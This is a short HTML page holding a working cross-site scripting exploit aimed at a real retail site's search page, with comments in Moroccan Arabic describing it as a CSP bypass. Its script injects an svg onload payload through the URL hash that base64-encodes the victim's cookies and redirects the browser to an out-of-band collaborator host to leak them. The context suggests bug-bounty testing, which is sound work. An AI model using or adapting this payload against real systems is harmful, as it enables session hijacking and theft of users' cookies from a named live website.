<!DOCTYPE html>
<html>
<body>
    <script>
        // سكريبت كيهرب الداتا عن طريق تحويل الصفحة بالكامل
        let payload = `
            (function(){
                var cookies = btoa(document.cookie);
                var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?leak=" + cookies;
                
                // هاد السطر كيهرب من الـ CSP حيت كيدير Redirect كامل للمتصفح
                window.location.replace(collab);
            })();
        `;

        let encodedPayload = encodeURIComponent(payload);

        // الرابط باستعمال الـ Hash (#) اللي نفعنا فـ الـ Bypass
        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";

        window.location.href = finalTarget;
    </script>
</body>
</html>
